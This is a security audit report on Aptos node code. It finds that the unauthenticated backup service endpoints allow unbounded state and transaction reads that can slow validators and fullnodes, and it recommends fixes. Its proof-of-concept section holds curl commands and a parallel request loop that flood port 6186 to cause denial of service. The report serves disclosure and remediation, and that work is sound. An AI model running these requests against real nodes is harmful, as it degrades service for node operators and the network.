# Audit Report

## Title
Unauthenticated Backup Service Endpoints Allow Excessive Database Reads Causing Validator/Fullnode Performance Degradation

## Summary
The backup service exposes HTTP endpoints without authentication or rate limiting that allow attackers to request unlimited state data from the database. When configured to bind to public interfaces (0.0.0.0), attackers can craft queries causing excessive database reads, I/O contention, and CPU consumption, degrading validator/fullnode performance and potentially affecting consensus timing.

## Finding Description
The security question references `aptos-warp-webserver/src/webserver.rs` which is a generic webserver wrapper. The actual vulnerability exists in the backup service that uses this webserver infrastructure. [1](#0-0) 

The backup service provides several HTTP endpoints for querying blockchain state. Two critical endpoints lack proper input validation:

**Vulnerability 1: Unlimited State Snapshot** [2](#0-1) 

The `/state_snapshot/<version>` endpoint calls `get_state_item_iter(version, 0, usize::MAX)`, attempting to read ALL state items from the database with no limit.

**Vulnerability 2: Unvalidated Chunk Limit** [3](#0-2) 

The `/state_snapshot_chunk/<version>/<start_idx>/<limit>` endpoint accepts a user-controlled `limit` parameter with no validation before iterating through state items.

**Shared Database Instance** [4](#0-3) 

The backup service shares the same AptosDB instance with consensus and execution components, meaning excessive reads affect all node operations.

**Public Exposure in Production Configs** [5](#0-4) [6](#0-5) 

Default fullnode configurations bind the backup service to `0.0.0.0:6186`, exposing it to all network interfaces.

**No Authentication** [7](#0-6) 

The routes are exposed via plain HTTP GET requests with no authentication middleware.

**Attack Path:**
1. Attacker identifies a fullnode with backup service exposed on `0.0.0.0:6186`
2. Attacker sends: `GET http://<node-ip>:6186/state_snapshot/<latest_version>`
3. Server attempts to read ALL state items (potentially millions) via `usize::MAX` limit
4. Database performs expensive Jellyfish Merkle tree iteration
5. RocksDB block cache (24GB default) gets polluted with backup data
6. I/O bandwidth saturated reading state from disk
7. Consensus-critical operations slow down waiting for database access

## Impact Explanation
This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria: "Validator node slowdowns".

**Resource Exhaustion Impact:**
- **I/O Bandwidth**: Reading millions of state items saturates disk I/O, delaying consensus reads
- **CPU**: Merkle tree iteration and BCS serialization consume CPU cycles
- **Memory**: Buffered state data can exhaust available memory
- **Cache Pollution**: RocksDB's 24GB block cache gets filled with backup data, evicting consensus-critical blocks [8](#0-7) 

**Consensus Timing Impact:**
When validators run fullnode configurations (VFNs), this can affect consensus timing:
- Block proposal delays due to state read latency
- Vote processing delays affecting BFT liveness
- State commitment delays backing up consensus rounds

## Likelihood Explanation
**High Likelihood:**
- Default fullnode/VFN configurations expose the service publicly
- No authentication barrier to exploitation
- Simple HTTP GET requests - no special tooling needed
- Attacker only needs network access to port 6186
- Multiple vulnerable endpoints (`state_snapshot`, `state_snapshot_chunk`, `transactions`)

The vulnerability is **immediately exploitable** on any fullnode deployed with default helm configurations.

## Recommendation
Implement multiple layers of defense:

**1. Input Validation - Add Maximum Limits**
```rust
// In storage/backup/backup-service/src/handlers/mod.rs

const MAX_STATE_SNAPSHOT_CHUNK_SIZE: usize = 10_000; // Match MAX_REQUEST_LIMIT
const MAX_TRANSACTION_BATCH_SIZE: usize = 10_000;

// For state_snapshot_chunk endpoint:
let state_snapshot_chunk = warp::path!(Version / usize / usize)
    .and_then(move |version, start_idx, limit: usize| async move {
        if limit > MAX_STATE_SNAPSHOT_CHUNK_SIZE {
            return Err(warp::reject::custom(TooManyRequested(limit, MAX_STATE_SNAPSHOT_CHUNK_SIZE)));
        }
        // ... rest of handler
    })
    
// For state_snapshot endpoint - remove or limit:
// Option A: Remove the unlimited endpoint entirely
// Option B: Add pagination with enforced max chunk size
let state_snapshot = warp::path!(Version / usize / usize) // Add start_idx, limit
    .and_then(move |version, start_idx, limit: usize| async move {
        if limit > MAX_STATE_SNAPSHOT_CHUNK_SIZE {
            return Err(warp::reject::custom(TooManyRequested(limit, MAX_STATE_SNAPSHOT_CHUNK_SIZE)));
        }
        // ... iterate with limit
    })
```

**2. Rate Limiting**
Add per-IP rate limiting using the `aptos-rate-limiter` crate or warp middleware.

**3. Authentication**
Add API key authentication similar to the admin service configuration.

**4. Configuration Security**
Change default binding to localhost only in production configs:
```yaml
storage:
  backup_service_address: "127.0.0.1:6186"  # Not 0.0.0.0
```

**5. Documentation**
Warn operators about the security implications of exposing the backup service publicly.

## Proof of Concept

**Setup:** Deploy a fullnode using default helm configuration (backup service on 0.0.0.0:6186)

**Attack:**
```bash
# Get latest version
LATEST_VERSION=$(curl -s http://node-ip:8080/v1 | jq -r '.ledger_version')

# Attack 1: Request unlimited state snapshot (will attempt to read ALL state)
curl "http://node-ip:6186/state_snapshot/${LATEST_VERSION}"

# Attack 2: Request excessive state chunks (repeat to amplify)
for i in {0..100}; do
  START_IDX=$((i * 1000000))
  curl "http://node-ip:6186/state_snapshot_chunk/${LATEST_VERSION}/${START_IDX}/999999" &
done

# Attack 3: Request excessive transactions
curl "http://node-ip:6186/transactions/0/999999999"
```

**Expected Impact:**
- Database I/O spikes to 100%
- Node API response times increase 10-100x
- Consensus participation delays (for validators)
- Potential OOM if state data exceeds available memory

**Verification:**
Monitor node metrics during attack:
- `aptos_backup_state_snapshot_version` counter increases rapidly
- RocksDB metrics show excessive read operations
- Node becomes slow to respond to API queries
- (For validators) Consensus round times increase

## Notes
This vulnerability affects both the specific webserver implementation mentioned in the security question and demonstrates how improperly secured HTTP endpoints can impact validator performance and consensus timing through shared database resource exhaustion. The backup service's lack of authentication, rate limiting, and input validation creates a trivial DoS vector against production nodes.

### Citations

**File:** storage/backup/backup-service/src/lib.rs (L12-30)
```rust
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);

    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);

    // Ensure that we actually bind to the socket first before spawning the
    // server tasks. This helps in tests to prevent races where a client attempts
    // to make a request before the server task is actually listening on the
    // socket.
    //
    // Note: we need to enter the runtime context first to actually bind, since
    //       tokio TcpListener can only be bound inside a tokio context.
    let _guard = runtime.enter();
    let server = warp::serve(routes).bind(address);
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L47-56)
```rust
    // GET state_snapshot/<version>
    let bh = backup_handler.clone();
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L70-79)
```rust
    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L125-147)
```rust
    let routes = warp::any()
        .and(warp::path(DB_STATE).and(db_state))
        .or(warp::path(STATE_RANGE_PROOF).and(state_range_proof))
        .or(warp::path(STATE_SNAPSHOT).and(state_snapshot))
        .or(warp::path(STATE_ITEM_COUNT).and(state_item_count))
        .or(warp::path(STATE_SNAPSHOT_CHUNK).and(state_snapshot_chunk))
        .or(warp::path(STATE_ROOT_PROOF).and(state_root_proof))
        .or(warp::path(EPOCH_ENDING_LEDGER_INFOS).and(epoch_ending_ledger_infos))
        .or(warp::path(TRANSACTIONS).and(transactions))
        .or(warp::path(TRANSACTION_RANGE_PROOF).and(transaction_range_proof));

    // Serve all routes for GET only.
    warp::get()
        .and(routes)
        .with(warp::log::custom(|info| {
            let endpoint = info.path().split('/').nth(1).unwrap_or("-");
            LATENCY_HISTOGRAM.observe_with(
                &[endpoint, info.status().as_str()],
                info.elapsed().as_secs_f64(),
            )
        }))
        .boxed()
}
```

**File:** aptos-node/src/storage.rs (L68-73)
```rust
        Either::Left(db) => {
            let (db_arc, db_rw) = DbReaderWriter::wrap(db);
            let db_backup_service =
                start_backup_service(node_config.storage.backup_service_address, db_arc.clone());
            maybe_apply_genesis(&db_rw, node_config)?;
            (db_arc as Arc<dyn DbReader>, db_rw, Some(db_backup_service))
```

**File:** terraform/helm/aptos-node/files/configs/fullnode-base.yaml (L13-16)
```yaml
storage:
  rocksdb_configs:
    enable_storage_sharding: true
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L67-68)
```yaml
storage:
  backup_service_address: "0.0.0.0:6186"
```

**File:** config/src/config/storage_config.rs (L206-212)
```rust
    /// The size of the single block cache shared by all the DB instances in `AptosDB`.
    pub shared_block_cache_size: usize,
}

impl RocksdbConfigs {
    /// Default block cache size is 24GB.
    pub const DEFAULT_BLOCK_CACHE_SIZE: usize = 24 * (1 << 30);
```
